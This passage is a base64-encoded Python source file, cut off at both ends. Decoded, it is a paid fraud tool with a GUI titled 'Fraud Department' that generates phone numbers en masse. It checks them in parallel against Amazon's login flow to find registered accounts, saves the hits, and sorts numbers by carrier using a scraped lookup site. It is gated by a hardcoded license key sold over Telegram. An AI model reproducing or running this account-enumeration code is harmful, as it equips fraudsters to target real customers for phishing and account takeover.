QxR3J0WUticmRUZzBkZk9qNGJCLzVhbEtMVDlsNXZmenlKdm9CT2hYVVd2Qm9TbEFMeklJdmVSWUsvRElPdE5NcTdxUStaY2hubEJvc3JHNUpUQmNxM1dpRUNiVi9sSWkvNi9mdHcrRHJ6a3U0TEpRMEJyMFk3SXRiejZxNnMvQ1BaODhsSTU2SVFoR1diaU5KZ2hGWjB3bWR2RTZLQW95R0dzaS90eERDYllpUjRqRC9UOU02a3QzS0xZV3FENDlac28ydTJvZEhjam04WDVvcjJMQVNXWXRwWHNhaWdHcExiaVlRQkhERS9oQTcwK21HVG5DZEFZOVJ4clFzN0tRV29aRjIxcWxCR3FaRWw2aVdqTnZnMzZXdmhmWnpMZFIzdGhCMmI2RXQxaHhSbGx1TGt6djhiclVLTTh4WUwvNXpraTZtZTR1QmhVU1c3UUxjSUdSQVQ5OG81VVZVS2dGNjdpcllveVF2dlhwQjN0em1KdDZ1MDJQZ291U2o5STVNOFN2bmMwNGJycmpFbncySCtNdlk1VmVKUFhmdDlyTW8rR3o1ZVhjVjNac29kaXB2YWQwQVllMnpXOEwzdVd3Ukt3TW1PTHNTMVZLcjBPVVlCaDZ1SVJvcFJFbTJSQUF1c0VoOGFQamNHemZTVzJjYWk4SHdOSG9iZW9YWHlGdHdJQzZDYTNGZ0dHZi8yaUhlbHBoaDUrKzBJS0RXMlFTM2xsRkd2dnN1Y0ZneXNMR2lJbG9zK3kvTkhCU2s5K3gvQnhxaFBTTXBEUllZblpKR0szZWxGektONk5ia0R4dHFGQjBEaTdQZGR5cDBoeFk5TzZ0UHlZMG1QRGV6Z3p6clpCenV3T242clRCQzJoMUpLcW12NFNGSmY2VGVqUXIyeWR5OFZPWTRjZkZJenMrTkxFaXM4bnYxVkpNWDV2MEMxWElUNEJMdnNySWwyOXZZUXJyb2czT3lHRkJTajF2TVoyc3NDOExqQ3hySTNHSHQvaWNvblhmY2hEdmFBd2JoSWNvOFVlWXl1VWZXV2IwMVNlSGdaQ0V2M0FJU2R2eERMckRqRURXYlVBTlhMa2hyaHZLTnJnbXBVTE90WU4wNk9kQTM3L1RwS0QzcFh2MlJxa1VVcWlvdHVrS0hvSnY4VEluN1F1WjJMaXVVbDdBRVpEVjNPNDU1T0RWUnZWb1FMdWV3dms4RTRudVF6WkxhajJhUWlveWo1SkpIa1VNNEhCNFJzUng0OUJ6ZGhBZENlL0hiVWRicTg0Ykw2M2tMeDdkSGNIWFJqMWJFbDI4TVVZMHU0clo5QXpwQlVtZnJ1UDM3UVVSV1hGRFN0by9mbDhpazNKYzg5SG9YUWFEeDlPVXBpVDJHYVpyaXBYOGNUTk1zN3E1Sk5neHdCckFrV1ZKR0I2VGFndXNEM2xUMGEydXFnb3FwV1Y5Uy9BWXhXUHpyOE5zd3hRaVZYbGNSajVIRDhvZS9NbmtiNUxuUTVLZEh3cC9Mck9pZHExaS9zcmFvcXVJcFJ3M3dPTFpSNExVcmUzNWZqNTdKUHk2WmFidUo3dDV6K1NkUWZuT0JlVU0vVXhobXNyMFErOTZOWmtEZXNUYnpKc3lCdVBSM0QyWnh2U0tQVVpMNnpkcU9nVUE1Qjdlbm9jeDI0dEFYTmNia1NQN1lFd2YrNkZIRUxaYmtGK0ZhZWpBd0RkQ1RiYmp6dDhENkwvRzQxZnRpSVRKUnFoQmZpL0tNZzdVempqQlJ3N0RQV1JiY3Y3YjJ6RzZpYmVpSGlzU2E4QnFjMmNpbHNDc3MwZkJ2N21QZXd6cmo1cFVCVGdpZnBYLzNoYk1EL0dEUmQ0U0wyV2g2LzdFMjVlNzBjTE9ZYnovNjJOR0VGQXNvZWRvSlFCanF6dm94dERsWGU5QVhqT0prM2EySXhjeTlFZFFqQTgrd243M29GUUlmenVXSUhRMjRZbldENWZCS3FNQThHMFcydGo4WXNTYk56T0hTRGR4OTJUS1VsRWhoTE8wSkRQaE4vLy9oYXhDdEpLYjU2VVRGaDI5dTF2ZGRVOFdMYko1N3lydWtHc1lDQ1MvSEp2M01qZXBRaXVyLzl4TS90dlV6WWQzZmhnejV2UndtMFFYMHl3V3NBbUYrNFVLeDc1enlMbzJBa0ZpL29hV3ZNanBYelcyUDErNk9RcFFVRDVRMFdmaUhrWnBnMHI2T3JSRGFvUFpaVHNXMjVnYW81ZFhKL0YrSVhLMVVxRzMwL0lzQlpKUDdHaWh6N3BPcXZ5SDBOMkNrM3VXVG85ckVyamJWSzIrZitBd2lFV0dwOVhjRjB5WHRBVUdyWGNZREJRbzQyVWJFcnNmZ3pyUkh5Qlp2N0ZkWU51UkpYeks1aHhGejRMY2VRUXpiWjJDdmxwTi96UERkZjk2ay9jMVhRMmJlY3QzcG0wNjltMmp6RkxidENmVlhWMm9rVHc4Z1JHa2c4TFpITkJyaWxyZG5NRGVtRXJzQ2NOeDhVUUJwYW5YemlQQzRQb01GOHFMMlJIV3RsM0MxTlVCVHV0NURHVDlOOEViSVA4bGNCVm5yVzFjUEd2Z0wwUG9STnNZWDdpOXRxdTdLYlNGcS9YSGFRTFV4WUZuVVJ4V0RIVSswVklOWnNka1ZpbVJtdzRPTDJMOWhnZmdXK3VueWtJSXVXOE16YVVjRlliZytTM3hVRWc2SkJRdTl5Z0JUU2FWNEFrS2Jta2E1cXJtZkQxMG56MmRTbm41Q1E4WVF3S0Q3blFkYkdEbm8xZGdydzBqUEcyalI3SHh2V2JnOERSZ3FvWGt0ZXhFWERhMCtWUG9qOURjYjRFWk5DTTZhK2NUTUFlRkgwdWpJREErdWxXZ0s4TmtEdGhXMDhMVDRwVklRTFkvczRoRWtUVC9PRXNYSXl5MHFHOCs2c2V0Rzc2TU5xNXBZbDhvQzkvNUZCZ2xLVDZtdXZNbFQ5ODBLdFBnaT09IgogICAgICAgICAgICAgKQogICAgICAgIH0KICAgICAgICByZXMgPSBzZWxmLnNlc3Npb24ucG9zdChzZWxmLnVybCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXJzPWhlYWRlcnMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llcz1jb29raWVzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE9ZGF0YSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2ZXJpZnk9RmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZW91dD0xNSkudGV4dAoKICAgICAgICBpZiAiYXBfY2hhbmdlX2xvZ2luX2NsYWltIiBpbiByZXM6CiAgICAgICAgICAgIHJldHVybiBUcnVlLCByZXMKICAgICAgICBlbGlmICJUaGVyZSB3YXMgYSBwcm9ibGVtIiBpbiByZXM6CiAgICAgICAgICAgIHJldHVybiBGYWxzZSwgcmVzCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIEZhbHNlLCByZXMKCgpkZWYgZnVuX2FjdGlvbihudW0pOgogICAgbnVtID0gbnVtLnN0cmlwKCkKICAgIGlmIG51bS5pc251bWVyaWMoKSBhbmQgIisiIG5vdCBpbiBudW06CiAgICAgICAgbnVtID0gIislcyIgJSBudW0KICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB2YWxpZCwgXyA9IEFtYXpvbihudW0pLmNoZWNrKCkKICAgICAgICAgICAgaWYgdmFsaWQ6CiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oIlZhbGlkMzMudHh0IiwgImEiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmZjoKICAgICAgICAgICAgICAgICAgICBmZi53cml0ZSgiJXNcbiIgJSBudW0pCiAgICAgICAgICAgICAgICBwcmludChjb2xvcmVkKCJbK10gVmFsaWQgICA9PT4gSGl0ICVzIiAlIG51bSwgImdyZWVuIikpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludChjb2xvcmVkKCJbLV0gSW52YWxpZCA9PT4gQmFkICVzIiAlIG51bSwgInJlZCIpKQogICAgICAgICAgICBicmVhawogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIGNvbnRpbnVlCgoKZGVmIHByb2Nlc3NfbnVtYmVycygpOgogICAgIiIiUHJvY2VzcyBwaG9uZSBudW1iZXJzIGZyb20gR2VuLnR4dCB1c2luZyBhIG11bHRpcHJvY2Vzc2luZyBQb29sLiIiIgogICAgZ2xvYmFsIGNvbXBsZXRlZF90YXNrcywgdG90YWxfbnVtYmVycwogICAgdHJ5OgogICAgICAgIHNlZW4gPSBzZXQoKQogICAgICAgIG51bWJlcnMgPSBbXQogICAgICAgIHdpdGggb3BlbigiR2VuLnR4dCIsICJyIiwgZW5jb2Rpbmc9IkxhdGluLTEiKSBhcyBmOgogICAgICAgICAgICBmb3IgbGluZSBpbiBmOgogICAgICAgICAgICAgICAgbnVtID0gbGluZS5zdHJpcCgpCiAgICAgICAgICAgICAgICBpZiBudW0gYW5kIG51bSBub3QgaW4gc2VlbjoKICAgICAgICAgICAgICAgICAgICBzZWVuLmFkZChudW0pCiAgICAgICAgICAgICAgICAgICAgbnVtYmVycy5hcHBlbmQobnVtKQogICAgICAgIHRvdGFsX251bWJlcnMgPSBsZW4obnVtYmVycykKICAgICAgICBwcmludChjb2xvcmVkKGYiUHJvY2Vzc2luZyB7dG90YWxfbnVtYmVyc30gZW50cmllcy4uLiIsICd5ZWxsb3cnKSkKICAgICAgICBwb29sX3NpemUgPSA2MAogICAgICAgIHdpdGggUG9vbChwb29sX3NpemUpIGFzIHBvb2w6CiAgICAgICAgICAgIGZvciBfIGluIHBvb2wuaW1hcF91bm9yZGVyZWQoZnVuX2FjdGlvbiwgbnVtYmVycyk6CiAgICAgICAgICAgICAgICB3aXRoIHByb2dyZXNzX2xvY2s6CiAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkX3Rhc2tzICs9IDEKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChlKQoKCiMgLS0tIFBob25lIE51bWJlciBWYWxpZGF0b3IgKENhcnJpZXIgTG9va3VwKSAtLS0KY2xhc3MgUGhvbmVOdW1iZXJWYWxpZGF0b3I6CgogICAgZGVmIGxvb2t1cF9jYXJyaWVyX2luZm8oc2VsZiwgbnBhLCBueHgpOgogICAgICAgIHVybCA9IGYiaHR0cHM6Ly93d3cuYXJlYS1jb2Rlcy5jb20vZXhjaGFuZ2UvZXhjaGFuZ2UuYXNwP25wYT17bnBhfSZueHg9e254eH0iCiAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgJ1VzZXItQWdlbnQnOgogICAgICAgICAgICAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2ICcKICAgICAgICAgICAgJyhLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMTAgU2FmYXJpLzUzNy4zNicKICAgICAgICB9CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICBzb3VwID0gQmVhdXRpZnVsU291cChyZXNwb25zZS50ZXh0LCAnaHRtbC5wYXJzZXInKQogICAgICAgICAgICBhbGxfdGV4dCA9IHNvdXAuZ2V0X3RleHQoKQogICAgICAgICAgICBpZiBhbGxfdGV4dDoKICAgICAgICAgICAgICAgIGNhcnJpZXJfbWF0Y2ggPSByZS5zZWFyY2gocidDYXJyaWVyL0NvbXBhbnk6KC4qPylaSVAgQ29kZScsIGFsbF90ZXh0LCByZS5ET1RBTEwpCiAgICAgICAgICAgICAgICBpZiBjYXJyaWVyX21hdGNoOgogICAgICAgICAgICAgICAgICAgIGNhcnJpZXJfaW5mbyA9IGNhcnJpZXJfbWF0Y2guZ3JvdXAoMSkuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICNwcmludChjb2xvcmVkKGYiQ2FycmllciBsb29rdXAgZm9yIHtucGF9LXtueHh9OiB7Y2Fycmllcl9pbmZvfSIsICJncmVlbiIpKQogICAgICAgICAgICAgICAgICAgIHJldHVybiBjYXJyaWVyX2luZm8KICAgICAgICByZXR1cm4gTm9uZQoKICAgIGRlZiBwcm9jZXNzX2JhdGNoKHNlbGYsIHBob25lX251bWJlcnMpOgogICAgICAgIHZhbGlkX3Jlc3VsdHMgPSB7fQogICAgICAgIGZvciBsaW5lIGluIHBob25lX251bWJlcnM6CiAgICAgICAgICAgIG1hdGNoID0gcmUuc2VhcmNoKHInXCsxIFwoKFxkezN9KVwpIChcZHszfSktKFxkezR9KScsIGxpbmUpCiAgICAgICAgICAgIGlmIG1hdGNoOgogICAgICAgICAgICAgICAgbnBhID0gbWF0Y2guZ3JvdXAoMSkKICAgICAgICAgICAgICAgIG54eCA9IG1hdGNoLmdyb3VwKDIpCiAgICAgICAgICAgICAgICBjYXJyaWVyX2luZm8gPSBzZWxmLmxvb2t1cF9jYXJyaWVyX2luZm8obnBhLCBueHgpCiAgICAgICAgICAgICAgICBpZiBjYXJyaWVyX2luZm86CiAgICAgICAgICAgICAgICAgICAgcGhvbmVfbnVtYmVyID0gcmUuc3ViKHInXEQnLCAnJywgbGluZS5zdHJpcCgpLnNwbGl0KCJ8IilbMF0uc3RyaXAoKSkKICAgICAgICAgICAgICAgICAgICBpZiBjYXJyaWVyX2luZm8gbm90IGluIHZhbGlkX3Jlc3VsdHM6CiAgICAgICAgICAgICAgICAgICAgICAgIHZhbGlkX3Jlc3VsdHNbY2Fycmllcl9pbmZvXSA9IFtwaG9uZV9udW1iZXJdCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgdmFsaWRfcmVzdWx0c1tjYXJyaWVyX2luZm9dLmFwcGVuZChwaG9uZV9udW1iZXIpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoY29sb3JlZChmIntsaW5lLnN0cmlwKCl9IHwgQ2Fycmllcjoge2NhcnJpZXJfaW5mb30iLCAiZ3JlZW4iKSkKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oImFsbF9sb29rdXBfbnVtYmVycy50eHQiLCAiYSIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUocGhvbmVfbnVtYmVyICsgIlxuIikKICAgICAgICByZXR1cm4gdmFsaWRfcmVzdWx0cwoKICAgIGRlZiBydW4oc2VsZiwgaW5wdXRfZmlsZW5hbWUpOgogICAgICAgIG91dHB1dF9mb2xkZXIgPSAidmFsaWRhdGVkX251bWJlcnMiCiAgICAgICAgb3MubWFrZWRpcnMob3V0cHV0X2ZvbGRlciwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICAjIENsZWFyIHRoZSBmb2xkZXIgYmVmb3JlIGxvb2t1cAogICAgICAgIGNsZWFyX2RpcmVjdG9yeShvdXRwdXRfZm9sZGVyKQogICAgICAgIHZhbGlkX3Jlc3VsdHMgPSB7fQogICAgICAgIHdpdGggb3BlbihpbnB1dF9maWxlbmFtZSwgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICBsaW5lcyA9IGZpbGUucmVhZGxpbmVzKCkKICAgICAgICBudW1fYmF0Y2hlcyA9IDMwCiAgICAgICAgYmF0Y2hfc2l6ZSA9IG1heCgxLCBsZW4obGluZXMpIC8vIG51bV9iYXRjaGVzKQogICAgICAgIGJhdGNoZXMgPSBbbGluZXNbaTppICsgYmF0Y2hfc2l6ZV0gZm9yIGkgaW4gcmFuZ2UoMCwgbGVuKGxpbmVzKSwgYmF0Y2hfc2l6ZSldCiAgICAgICAgcG9vbCA9IG11bHRpcHJvY2Vzc2luZy5Qb29sKHByb2Nlc3Nlcz1udW1fYmF0Y2hlcykKICAgICAgICByZXN1bHRzID0gcG9vbC5tYXAoc2VsZi5wcm9jZXNzX2JhdGNoLCBiYXRjaGVzKQogICAgICAgIHBvb2wuY2xvc2UoKQogICAgICAgIHBvb2wuam9pbigpCiAgICAgICAgZm9yIGJhdGNoX3Jlc3VsdCBpbiByZXN1bHRzOgogICAgICAgICAgICBmb3IgY2FycmllciwgbnVtYmVycyBpbiBiYXRjaF9yZXN1bHQuaXRlbXMoKToKICAgICAgICAgICAgICAgIGlmIGNhcnJpZXIgbm90IGluIHZhbGlkX3Jlc3VsdHM6CiAgICAgICAgICAgICAgICAgICAgdmFsaWRfcmVzdWx0c1tjYXJyaWVyXSA9IG51bWJlcnMKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgdmFsaWRfcmVzdWx0c1tjYXJyaWVyXS5leHRlbmQobnVtYmVycykKICAgICAgICBmb3IgY2FycmllciwgbnVtYmVycyBpbiB2YWxpZF9yZXN1bHRzLml0ZW1zKCk6CiAgICAgICAgICAgIG91dHB1dF9maWxlbmFtZSA9IG9zLnBhdGguam9pbihvdXRwdXRfZm9sZGVyLCBmIntjYXJyaWVyfS50eHQiKQogICAgICAgICAgICB3aXRoIG9wZW4ob3V0cHV0X2ZpbGVuYW1lLCAndycpIGFzIG91dHB1dF9maWxlOgogICAgICAgICAgICAgICAgZm9yIHBob25lX251bWJlciBpbiBudW1iZXJzOgogICAgICAgICAgICAgICAgICAgIG91dHB1dF9maWxlLndyaXRlKHBob25lX251bWJlciArICdcbicpCiAgICAgICAgcHJpbnQoY29sb3JlZChmIntsZW4obGluZXMpfSBudW1iZXJzIHByb2Nlc3NlZC4gVmFsaWQgbnVtYmVycyBzYXZlZCBpbiB0aGVpciByZXNwZWN0aXZlIGNhcnJpZXIgZmlsZXMuIiwgImN5YW4iKSkKCgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgICAgICAgICAgICAgICAgICAgICAgICAgIEdVSSBBcHBsaWNhdGlvbiBDb2RlCiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KY2xhc3MgTWFpbkFwcCh0ay5Uayk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgKmFyZ3MsICoqa3dhcmdzKToKICAgICAgICB0ay5Uay5fX2luaXRfXyhzZWxmLCAqYXJncywgKiprd2FyZ3MpCiAgICAgICAgc2VsZi50aXRsZSgiRnJhdWQgRGVwYXJ0bWVudCAtIFBob25lIE51bWJlciBWYWxpZGF0aW9uIikKICAgICAgICBzZWxmLmdlb21ldHJ5KCI4MDB4NjAwIikKICAgICAgICBzZWxmLnJlc2l6YWJsZShGYWxzZSwgRmFsc2UpCiAgICAgICAgIyBHbG9iYWwgYmFja2dyb3VuZCBmb3IgdGhlIGFwcAogICAgICAgIHNlbGYuY29uZmlndXJlKGJnPSIjZjBmNGZmIikKCiAgICAgICAgIyBDb25maWd1cmUgdHRrIHN0eWxlIHdpdGggdXBkYXRlZCBjb2xvcnMgJiBkZXNpZ24KICAgICAgICBzdHlsZSA9IHR0ay5TdHlsZShzZWxmKQogICAgICAgIHN0eWxlLnRoZW1lX3VzZSgiY2xhbSIpCiAgICAgICAgc3R5bGUuY29uZmlndXJlKCJURnJhbWUiLCBiYWNrZ3JvdW5kPSIjZjBmNGZmIikKICAgICAgICBzdHlsZS5jb25maWd1cmUoIlRMYWJlbCIsIGJhY2tncm91bmQ9IiNmMGY0ZmYiLCBmb250PSgiU2Vnb2UgVUkiLCAxMSksIGZvcmVncm91bmQ9IiMzMzMiKQogICAgICAgIHN0eWxlLmNvbmZpZ3VyZSgiSGVhZGVyLlRMYWJlbCIsCiAgICAgICAgICAgICAgICAgICAgICAgIGZvbnQ9KCJTZWdvZSBVSSIsIDE4LCAiYm9sZCIpLAogICAgICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kPSIjMDAzMzY2IiwKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWdyb3VuZD0id2hpdGUiLAogICAgICAgICAgICAgICAgICAgICAgICBwYWRkaW5nPSgxMCwgMTApKQogICAgICAgIHN0eWxlLmNvbmZpZ3VyZSgiU3ViSGVhZGVyLlRMYWJlbCIsCiAgICAgICAgICAgICAgICAgICAgICAgIGZvbnQ9KCJTZWdvZSBVSSIsIDE0LCAiYm9sZCIpLAogICAgICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kPSIjZTZlZmZmIiwKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWdyb3VuZD0iIzAwMzM2NiIsCiAgICAgICAgICAgICAgICAgICAgICAgIHBhZGRpbmc9KDUsIDUpKQogICAgICAgIHN0eWxlLmNvbmZpZ3VyZSgiVEJ1dHRvbiIsCiAgICAgICAgICAgICAgICAgICAgICAgIGZvbnQ9KCJTZWdvZSBVSSIsIDEwLCAiYm9sZCIpLAogICAgICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kPSIjMDA1MmNjIiwKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWdyb3VuZD0id2hpdGUiLAogICAgICAgICAgICAgICAgICAgICAgICBwYWRkaW5nPTUpCiAgICAgICAgc3R5bGUubWFwKCJUQnV0dG9uIiwKICAgICAgICAgICAgICAgICAgYmFja2dyb3VuZD1bKCJhY3RpdmUiLCAiIzAwM2Q5OSIpXSwKICAgICAgICAgICAgICAgICAgZm9yZWdyb3VuZD1bKCJhY3RpdmUiLCAid2hpdGUiKV0pCiAgICAgICAgc3R5bGUuY29uZmlndXJlKCJURW50cnkiLCBmb250PSgiU2Vnb2UgVUkiLCAxMCksIHBhZGRpbmc9NSkKICAgICAgICBzdHlsZS5jb25maWd1cmUoIlRDb21ib2JveCIsCiAgICAgICAgICAgICAgICAgICAgICAgIGZvbnQ9KCJTZWdvZSBVSSIsIDEwKSwKICAgICAgICAgICAgICAgICAgICAgICAgZmllbGRiYWNrZ3JvdW5kPSJ3aGl0ZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIGJhY2tncm91bmQ9IndoaXRlIikKICAgICAgICBzdHlsZS5jb25maWd1cmUoIkhvcml6b250YWwuVFByb2dyZXNzYmFyIiwgdHJvdWdoY29sb3I9IiNjY2UwZmYiLCBib3JkZXJjb2xvcj0iI2NjZTBmZiIsIGJhY2tncm91bmQ9IiMwMDUyY2MiKQoKICAgICAgICAjIE1haW4gY29udGFpbmVyIGZyYW1lIGZvciBwYWdpbmF0aW9uCiAgICAgICAgY29udGFpbmVyID0gdHRrLkZyYW1lKHNlbGYpCiAgICAgICAgY29udGFpbmVyLnBhY2soc2lkZT0idG9wIiwgZmlsbD0iYm90aCIsIGV4cGFuZD1UcnVlLCBwYWR4PTE1LCBwYWR5PTE1KQogICAgICAgIGNvbnRhaW5lci5ncmlkX3Jvd2NvbmZpZ3VyZSgwLCB3ZWlnaHQ9MSkKICAgICAgICBjb250YWluZXIuZ3JpZF9jb2x1bW5jb25maWd1cmUoMCwgd2VpZ2h0PTEpCgogICAgICAgIHNlbGYuZnJhbWVzID0ge30KICAgICAgICBmb3IgRiBpbiAoR2VuZXJhdG9yUGFnZSwgVmFsaWRhdGlvblBhZ2UsIENhcnJpZXJMb29rdXBQYWdlKToKICAgICAgICAgICAgcGFnZV9uYW1lID0gRi5fX25hbWVfXwogICAgICAgICAgICBmcmFtZSA9IEYocGFyZW50PWNvbnRhaW5lciwgY29udHJvbGxlcj1zZWxmKQogICAgICAgICAgICBzZWxmLmZyYW1lc1twYWdlX25hbWVdID0gZnJhbWUKICAgICAgICAgICAgZnJhbWUuZ3JpZChyb3c9MCwgY29sdW1uPTAsIHN0aWNreT0ibnNldyIpCgogICAgICAgIHNlbGYuY2hlY2tfbGljZW5zZV9rZXkoKQogICAgICAgIHNlbGYuc2hvd19mcmFtZSgiR2VuZXJhdG9yUGFnZSIpCgogICAgZGVmIHNob3dfZnJhbWUoc2VsZiwgcGFnZV9uYW1lKToKICAgICAgICBmcmFtZSA9IHNlbGYuZnJhbWVzW3BhZ2VfbmFtZV0KICAgICAgICBmcmFtZS50a3JhaXNlKCkKICAgICAgICBpZiBoYXNhdHRyKGZyYW1lLCAib25fc2hvdyIpOgogICAgICAgICAgICBmcmFtZS5vbl9zaG93KCkKCiAgICBkZWYgY2hlY2tfbGljZW5zZV9rZXkoc2VsZik6CiAgICAgICAgY29ycmVjdF9rZXkgPSAiQW5vbnltb3VzMTIzJCIKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBrZXkgPSBzaW1wbGVkaWFsb2cuYXNrc3RyaW5nKCJMaWNlbnNlIEtleSIsICJQbGVhc2UgZW50ZXIgdGhlIGxpY2Vuc2Uga2V5OiIsIHNob3c9JyonLCBwYXJlbnQ9c2VsZikKICAgICAgICAgICAgaWYga2V5IGlzIE5vbmU6CiAgICAgICAgICAgICAgICBzZWxmLmRlc3Ryb3koKQogICAgICAgICAgICAgICAgc3lzLmV4aXQoMCkKICAgICAgICAgICAgaWYga2V5ID09IGNvcnJlY3Rfa2V5OgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIG1lc3NhZ2Vib3guc2hvd2Vycm9yKCJFcnJvciIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiSW5jb3JyZWN0IGxpY2Vuc2Uga2V5LiBQdXJjaGFzZSBhIGxpY2Vuc2Uga2V5IGF0IGh0dHBzOi8vdC5tZS9UaXpsaW9uIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcmVudD1zZWxmKQoKCiMgLS0tLS0tLS0tLS0tLS0tLS0gUGFnZSAxOiBQaG9uZSBOdW1iZXIgR2VuZXJhdG9yIC0tLS0tLS0tLS0tLS0tLS0tCmNsYXNzIEdlbmVyYXRvclBhZ2UodHRrLkZyYW1lKToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwYXJlbnQsIGNvbnRyb2xsZXIpOgogICAgICAgIHR0ay5GcmFtZS5fX2luaXRfXyhzZWxmLCBwYXJlbnQpCiAgICAgICAgc2VsZi5jb250cm9sbGVyID0gY29udHJvbGxlcgogICAgICAgIHNlbGYuYW5pbWF0aW5nID0gRmFsc2UKICAgICAgICBzZWxmLmFuaW1hdGlvbl9pbmRleCA9IDAKICAgICAgICBzZWxmLmFuaW1hdGlvbl90ZXh0cyA9IFsiRi5EZXB0IEFJIEdlbmVyYXRpbmcuIiwgIkYuRGVwdCBBSSBHZW5lcmF0aW5nLi4iLCAiRi5EZXB0IEFJIEdlbmVyYXRpbmcuLi4iXQoKICAgICAgICAjIEhlYWRlciBTZWN0aW9uCiAgICAgICAgaGVhZGVyID0gdHRrLkxhYmVsKHNlbGYsIHRleHQ9IiAgICAgICAgICAgICAgICAgICAgV2VsY29tZSB0byBGLkRlcHQgUGhvbmUgTnVtYmVyIEdlbmVyYXRvciIsIHN0eWxlPSJIZWFkZXIuVExhYmVsIikKICAgICAgICBoZWFkZXIucGFjayhmaWxsPSJ4IiwgcGFkeT0oMCwgMTApKQoKICAgICAgICAjIEFuaW1hdGVkIGxhYmVsIGZvciB2aXN1YWwgZWZmZWN0CiAgICAgICAgc2VsZi5hbmltYXRpb25fbGFiZWwgPSB0dGsuTGFiZWwoc2VsZiwgdGV4dD0iIiwgZm9udD0oIlNlZ29lIFVJIiwgMTIsICJpdGFsaWMiKSwgZm9yZWdyb3VuZD0iIzAwNTJjYyIpCiAgICAgICAgc2VsZi5hbmltYXRpb25fbGFiZWwucGFjayhwYWR5PSgwLCAxMCkpCgogICAgICAgICMgRm9ybSBTZWN0aW9uIGNyZWF0aW9uIGluc2lkZSBhIGRlZGljYXRlZCBmcmFtZSB3aXRoIGJvcmRlciBhbmQgcGFkZGluZwogICAgICAgIGZvcm1fY29udGFpbmVyID0gdHRrLkZyYW1lKHNlbGYsIHJlbGllZj0iZ3Jvb3ZlIiwgcGFkZGluZz0xMCkKICAgICAgICBmb3JtX2NvbnRhaW5lci5wYWNrKHBhZHk9MTAsIHBhZHg9MjAsIGZpbGw9IngiKQoKICAgICAgICB0dGsuTGFiZWwoZm9ybV9jb250YWluZXIsIHRleHQ9IlNlbGVjdCBDb3VudHJ5IENvZGU6IikuZ3JpZChyb3c9MCwgY29sdW1uPTAsIHN0aWNreT0idyIsIHBhZHk9NSwgcGFkeD01KQogICAgICAgIHNlbGYuY291bnRyeV92YXIgPSB0ay5TdHJpbmdWYXIodmFsdWU9IjEiKQogICAgICAgIHNlbGYuY291bnRyeV9jb21ibyA9IHR0ay5Db21ib2JveChmb3JtX2NvbnRhaW5lciwgdGV4dHZhcmlhYmxlPXNlbGYuY291bnRyeV92YXIsIHN0YXRlPSJyZWFkb25seSIsIHZhbHVlcz1bIjEiLCAiNDQiLCAiNjEiXSkKICAgICAgICBzZWxmLmNvdW50cnlfY29tYm8uZ3JpZChyb3c9MCwgY29sdW1uPTEsIHN0aWNreT0iZXciLCBwYWR5PTUsIHBhZHg9NSkKCiAgICAgICAgdHRrLkxhYmVsKGZvcm1fY29udGFpbmVyLCB0ZXh0PSJBcmVhIENvZGVzIChjb21tYSBvciBzcGFjZSBzZXBhcmF0ZWQpOiIpLmdyaWQocm93PTEsIGNvbHVtbj0wLCBzdGlja3k9InciLCBwYWR5PTUsIHBhZHg9NSkKICAgICAgICBzZWxmLmFyZWFfZW50cnkgPSB0dGsuRW50cnkoZm9ybV9jb250YWluZXIpCiAgICAgICAgc2VsZi5hcmVhX2VudHJ5LmdyaWQocm93PTEsIGNvbHVtbj0xLCBzdGlja3k9ImV3IiwgcGFkeT01LCBwYWR4PTUpCiAgICAgICAgYWRkX2NvbnRleHRfbWVudShzZWxmLmFyZWFf